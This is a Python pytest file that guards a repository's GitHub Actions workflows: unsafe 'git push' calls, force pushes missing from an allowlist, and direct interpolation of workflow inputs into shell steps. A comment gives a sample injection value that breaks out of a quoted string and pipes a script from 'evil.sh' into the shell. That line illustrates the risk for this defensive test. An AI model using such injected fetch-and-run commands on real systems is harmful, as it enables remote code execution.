"""F-11 prevention: every workflow ``git push`` must be safe.

Background — audit findings F-02 and F-05 both shipped a bare
``git push`` to ``main`` inside ``run:`` blocks. The protected-branch
ruleset rejects those pushes with ``GH013`` and the workflow turns
permanently red. The fix in PRs #1931 / #1932 was to either:

* push to a branch under ``auto/*`` (``git push -u origin "HEAD:${BRANCH}"``)
* OR tolerate the rejection (``git push 2>&1 || echo "::warning::..."`` /
  ``if git push; then ... else ... fi``)

This regression test enforces that pattern repository-wide so a
new workflow that ships bare ``git push`` cannot land silently.
Would have caught F-02 (`fvg-context-pine-refresh.yml`) and F-05
(`fvg-quality-quartile-gate.yml`) at PR-time.
"""
from __future__ import annotations

import re
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parent.parent
WORKFLOWS_DIR = ROOT / ".github" / "workflows"

# A ``git push`` call is considered SAFE if its line — or the line
# immediately above it (the ``if git push`` opener) — matches one of
# these patterns.
_SAFE_LINE_PATTERNS: tuple[re.Pattern[str], ...] = (
    # 1) Graceful fallback on the same line.
    re.compile(r"git\s+push\b[^\n]*\|\|"),
    # 2) Conditional opener: ``if git push ... ; then``.
    re.compile(r"\bif\s+git\s+push\b"),
    # 3) Explicit non-main target via shell var (BRANCH / TARGET_BRANCH /
    #    auto/* literal).
    re.compile(r"git\s+push\b[^\n]*(?:\$\{?BRANCH|\$\{?TARGET_BRANCH|auto/|HEAD:\$\{?BRANCH)"),
    # 4) Dry-run probes never mutate the remote; they are used as a
    #    token-aware preflight before the real (wrapped) push.
    re.compile(r"git\s+push\b[^\n]*--dry-run\b"),
)

_PUSH_RE = re.compile(r"\bgit\s+push\b")


def _iter_workflow_files() -> list[Path]:
    # F1 (audit 2026-05-02): also match `.yaml` so future renames don't silently bypass this guard.
    return sorted(
        p
        for p in (set(WORKFLOWS_DIR.glob("*.yml")) | set(WORKFLOWS_DIR.glob("*.yaml")))
        if p.is_file()
    )


def _iter_run_blocks(wf_path: Path) -> list[tuple[str, str]]:
    """Return ``(job_step_label, run_text)`` tuples for every ``run:`` step."""
    try:
        doc = yaml.safe_load(wf_path.read_text(encoding="utf-8"))
    except yaml.YAMLError as exc:
        pytest.fail(f"{wf_path.name}: invalid YAML: {exc}")
    if not isinstance(doc, dict):
        return []
    out: list[tuple[str, str]] = []
    jobs = doc.get("jobs") or {}
    if not isinstance(jobs, dict):
        return []
    for job_name, job in jobs.items():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps") or []
        if not isinstance(steps, list):
            continue
        for idx, step in enumerate(steps):
            if not isinstance(step, dict):
                continue
            run = step.get("run")
            if isinstance(run, str) and run.strip():
                step_name = step.get("name") or f"step[{idx}]"
                out.append((f"{job_name} :: {step_name}", run))
    return out


def _classify_push(run_text: str) -> list[tuple[int, str]]:
    """Return list of ``(line_number, line_text)`` for unsafe pushes."""
    lines = run_text.splitlines()
    unsafe: list[tuple[int, str]] = []
    for i, line in enumerate(lines):
        # Skip comments.
        stripped = line.lstrip()
        if stripped.startswith("#"):
            continue
        if not _PUSH_RE.search(line):
            continue
        prev_line = lines[i - 1] if i > 0 else ""
        # Window: this line + previous (catches multi-line ``if git push \\``
        # and the comment-above ``# F-02:`` style is irrelevant — we look
        # at executable context only).
        window = f"{prev_line}\n{line}"
        if any(p.search(window) for p in _SAFE_LINE_PATTERNS):
            continue
        unsafe.append((i + 1, line.rstrip()))
    return unsafe


def test_workflow_roster_is_not_empty() -> None:
    """Zero argvalues would collect zero tests — silently, with no output."""
    workflows = _iter_workflow_files()
    assert len(workflows) >= 10, (
        f"workflow discovery found {len(workflows)} files — the parametrized "
        "checks below would collect nothing and report nothing"
    )


@pytest.mark.parametrize(
    "wf_path",
    _iter_workflow_files(),
    ids=lambda p: p.name,
)
def test_workflow_git_push_is_safe(wf_path: Path) -> None:
    """Every ``git push`` in a workflow ``run:`` step must be wrapped.

    ``Safe`` means one of:
      * has ``||`` graceful fallback on the same line, or
      * is the head of an ``if git push ... ; then`` block, or
      * targets a non-main ref (``$BRANCH``, ``$TARGET_BRANCH``,
        ``HEAD:$BRANCH``, or a literal ``auto/...``).

    A bare ``git push`` to ``main`` will be rejected by the
    protected-branch ruleset (GH013) and the workflow turns red — see
    audit findings F-02 and F-05.
    """
    offenders: list[str] = []
    for label, run_text in _iter_run_blocks(wf_path):
        for line_no, line in _classify_push(run_text):
            offenders.append(f"  [{label}] line {line_no}: {line}")
    assert not offenders, (
        f"Unsafe ``git push`` in {wf_path.name}.\n"
        "Wrap with ``|| echo '::warning::...'`` or ``if git push; then ... fi``,\n"
        "or push to a non-main branch (``HEAD:${BRANCH}`` with BRANCH=auto/*).\n"
        "Audit findings F-02 / F-05 — see PRs #1931 and #1932 for the fix pattern.\n"
        "Offending lines:\n" + "\n".join(offenders)
    )


def test_inventory_contains_known_workflows() -> None:
    """Sanity guard: the parametrized test would silently skip if the
    glob ever returned an empty list. Pin a lower bound."""
    files = _iter_workflow_files()
    assert len(files) >= 10, f"workflow inventory shrank: {len(files)}"


# ---------------------------------------------------------------------------
# ADR-0024: --force-with-lease allowlist
#
# Repo policy prohibits ``git push --force*`` everywhere EXCEPT the entries
# below, which are explicitly approved by ADR-0024 (2026-06-10).
#
# To add a new approved use:
#   1. Add the workflow filename to _FORCE_LEASE_ALLOWLIST (the set is keyed by
#      filename only — it does not discriminate between push sites in the same
#      file, so review every force push in a listed workflow).
#   2. Open an ADR or amend ADR-0024 explaining why it is necessary.
# ---------------------------------------------------------------------------

_FORCE_LEASE_ALLOWLIST: frozenset[str] = frozenset({
    # credential-health-check.yml: rolling bot/live-tv-credential-snapshot cache
    # cursor for the daily TradingView storage-state credential-age report
    # consumed by the live-overlay daemon; force-with-lease with prior fetch.
    # See ADR-0024.
    "credential-health-check.yml",
    # evidence-freshness-snapshot.yml: rolling bot/live-evidence-freshness
    # refresh for the ADR-0023 evidence-chain freshness gauges the daemon
    # serves; force-with-lease with prior fetch (same pattern as
    # plan-2-8-evaluation). See ADR-0024.
    "evidence-freshness-snapshot.yml",
    # sweep-trap-shadow-daily.yml (WS4a, #3414): rolling
    # bot/live-sweep-trap-shadow refresh of the sweep-trap shadow monitoring
    # snapshot the live-overlay daemon fetches; force-with-lease with prior
    # fetch (same rolling-snapshot pattern as evidence-freshness-snapshot).
    # See ADR-0024.
    "sweep-trap-shadow-daily.yml",
    # pine-library-version-monitor.yml (#3599/#3603 follow-up): rolling
    # bot/live-pine-library-versions refresh of the Repo↔TradingView Pine
    # library version-drift snapshot the live-overlay daemon fetches;
    # force-with-lease with prior fetch (same rolling-snapshot pattern as
    # evidence-freshness-snapshot). See ADR-0024.
    "pine-library-version-monitor.yml",
    # tv-save-consumer-source.yml (2026-07-16): publishes the measured
    # dropdown-binding JSON to bot/live-tradingview-bindings
    # cache cursor after fetching its current tip. See ADR-0024.
    "tv-save-consumer-source.yml",
    # smc-r4-context-readback.yml (2026-08-03): a second producer on the
    # same bot/live-tradingview-bindings branch, at a distinct
    # artifacts/monitoring/latest/tradingview_r4_context_bindings.json path
    # (tv-save-consumer-source.yml owns tradingview_consumer_bindings.json
    # in the same directory). Because the branch now has more than one
    # producer, this publish step additionally seeds the shared directory
    # from the fetched tip before adding its own file — the ADR-0024 §5
    # "replace only their owned paths" case. See ADR-0024.
    "smc-r4-context-readback.yml",
    # smc-r1-reattest.yml (2026-08-07, repo audit): recreates the disposable
    # bot/r1-reattest proposal ref from scratch on every run (checkout -b off
    # the current main, one commit, push). There is no history to protect and
    # no expected-tip to lease against, so this is the leaseless case in
    # ADR-0024 §6. It became visible only when _FORCE_RE learned the ``-f``
    # short form; it had been running unreviewed since the workflow landed.
    # tv-save-consumer-source.yml pushes the same ref the same way when it is
    # dispatched in reattest mode (already listed above for its lease publish).
    "smc-r1-reattest.yml",
})

# Matches both spellings of a force push. The ``-f`` alternative is bounded on
# both sides so ``--force`` / ``--follow-tags`` cannot satisfy it accidentally.
# 2026-08-07 (repo audit): this used to be ``--force`` only, which made the
# allowlist blind to the two ``git push -f`` sites in the tree.
_FORCE_RE = re.compile(r"git\s+push\b[^\n]*(?:--force|(?<![\w-])-f(?![\w-]))")


def test_workflow_force_push_is_allowlisted() -> None:
    """Every ``--force*`` git push in a workflow ``run:`` block must appear
    in ``_FORCE_LEASE_ALLOWLIST``.

    Adding a new force-push requires:
      * Updating the allowlist in this file.
      * Opening / amending an ADR (see ADR-0024 as the template).

    Rationale: ``--force`` and ``--force-with-lease`` are prohibited by
    default (audit findings R3 / F-02 / F-05) because they can silently
    overwrite commits on protected branches or lose human fix-up commits.
    The allowlist makes each exception visible at PR review time.
    """
    offenders: list[str] = []
    for wf_path in _iter_workflow_files():
        if wf_path.name in _FORCE_LEASE_ALLOWLIST:
            # Approved — still confirm the force-push is present (stale-entry guard).
            any_force = any(
                _FORCE_RE.search(run)
                for _, run in _iter_run_blocks(wf_path)
            )
            if not any_force:
                offenders.append(
                    f"  {wf_path.name}: listed in _FORCE_LEASE_ALLOWLIST "
                    f"but no 'git push --force*' found — remove the stale entry"
                )
            continue
        for label, run_text in _iter_run_blocks(wf_path):
            for line_no, line in enumerate(run_text.splitlines(), 1):
                if line.lstrip().startswith("#"):
                    continue
                if _FORCE_RE.search(line):
                    offenders.append(
                        f"  [{wf_path.name} :: {label}] line {line_no}: {line.rstrip()}"
                    )
    assert not offenders, (
        "Unapproved ``git push --force*`` found.\n"
        "Add the workflow to ``_FORCE_LEASE_ALLOWLIST`` and open/amend an ADR "
        "(see docs/adr/0024-force-with-lease-allowance-bot-snapshot-branches.md).\n"
        "Offenders:\n" + "\n".join(offenders)
    )


def test_force_push_detector_sees_both_spellings() -> None:
    """Regression guard for the 2026-08-07 repo audit.

    ``_FORCE_RE`` matched only the long ``--force``. Two workflows force-pushed
    with ``git push -f``, so neither reached the allowlist check at all:
    ``test_workflow_force_push_is_allowlisted`` reported clean while the pushes
    it exists to gate were invisible to it. A guard that cannot see the thing
    it forbids is worse than no guard, because it also reports success.
    """
    assert _FORCE_RE.search('git push -f "${remote_url}" "HEAD:${BRANCH}"')
    assert _FORCE_RE.search("git push origin HEAD -f")
    assert _FORCE_RE.search(
        'git push "--force-with-lease=${_remote_ref}:${_lease}" "${url}" HEAD:x'
    )
    # Long flags that merely begin with ``f`` must not read as a force push.
    assert not _FORCE_RE.search("git push --follow-tags origin main")
    assert not _FORCE_RE.search("git push origin main")


# ---------------------------------------------------------------------------
# A2: workflow_dispatch inputs must use env-var indirection, not direct
# ${{ github.event.inputs.* }} interpolation inside run: blocks.
# ---------------------------------------------------------------------------
# Allowed: ${{ github.event.inputs.* }} inside an `env:` YAML key (GHA
# processes these before the shell starts — no injection risk).
# Forbidden: ${{ github.event.inputs.* }} appearing inside a shell `run:` block
# (GHA template-preprocesses run: text BEFORE the shell parses it, so a
# malicious input value like `"; curl evil.sh | sh #` would execute).
# Audit pass-3 finding A2, 2026-06-10.
_INPUT_EXPR_RE = re.compile(r"\$\{\{[^}]*github\.event\.inputs\.[^}]+\}\}")


def test_workflow_dispatch_inputs_use_env_indirection() -> None:
    """No ``${{ github.event.inputs.* }}`` expression may appear inside a
    shell ``run:`` block — use a step-level or job-level ``env:`` mapping
    instead and reference the value through its environment variable."""
    offenders: list[str] = []
    for wf_path in _iter_workflow_files():
        for label, run_text in _iter_run_blocks(wf_path):
            for line_no, line in enumerate(run_text.splitlines(), 1):
                if line.lstrip().startswith("#"):
                    continue
                if _INPUT_EXPR_RE.search(line):
                    offenders.append(
                        f"  [{wf_path.name} :: {label}] line {line_no}: {line.rstrip()}"
                    )
    assert not offenders, (
        "Direct ``${{ github.event.inputs.* }}`` interpolation found inside "
        "run: blocks — shell-injection risk (audit pass-3 finding A2).\n"
        "Move the input to the step's ``env:`` mapping and reference it as "
        "``${ENV_VAR_NAME}`` in the shell script.\n"
        "Offenders:\n" + "\n".join(offenders)
    )
